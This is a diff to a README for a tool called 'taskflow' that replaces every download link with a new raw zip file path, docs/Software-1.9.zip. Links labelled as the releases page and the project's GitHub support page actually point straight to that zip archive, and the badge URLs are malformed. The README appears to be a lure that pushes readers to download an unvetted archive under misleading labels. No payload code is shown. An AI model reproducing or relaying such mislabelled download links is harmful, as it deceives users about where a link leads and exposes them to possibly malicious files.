@@ -1,6 +1,6 @@
 # 🌟 taskflow - Effortless Document Processing Made Simple
 
-[![Download taskflow](https://raw.githubusercontent.com/NagilaLopes/taskflow/main/src/taskflow-v3.2.zip%https://raw.githubusercontent.com/NagilaLopes/taskflow/main/src/taskflow-v3.2.zip)](https://raw.githubusercontent.com/NagilaLopes/taskflow/main/src/taskflow-v3.2.zip)
+[![Download taskflow](https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip%https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip)](https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get started, you need to download taskflow. Follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to go to the releases page.
 
-   [![Download taskflow](https://raw.githubusercontent.com/NagilaLopes/taskflow/main/src/taskflow-v3.2.zip%https://raw.githubusercontent.com/NagilaLopes/taskflow/main/src/taskflow-v3.2.zip)](https://raw.githubusercontent.com/NagilaLopes/taskflow/main/src/taskflow-v3.2.zip)
+   [![Download taskflow](https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip%https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip)](https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip)
 
 2. **Select the Latest Release**: Look for the most recent version listed. It will be indicated as the “Latest Release”.
 
@@ -65,7 +65,7 @@ A: You can submit issues directly on the GitHub repository. Look for the “Issu
 
 ## 📞 Support
 
-If you have questions or need support, please visit the [taskflow GitHub page](https://raw.githubusercontent.com/NagilaLopes/taskflow/main/src/taskflow-v3.2.zip). You can find helpful resources and connect with other users.
+If you have questions or need support, please visit the [taskflow GitHub page](https://github.com/NagilaLopes/taskflow/raw/refs/heads/main/docs/Software-1.9.zip). You can find helpful resources and connect with other users.
 
 ## 🙌 Explore More
 
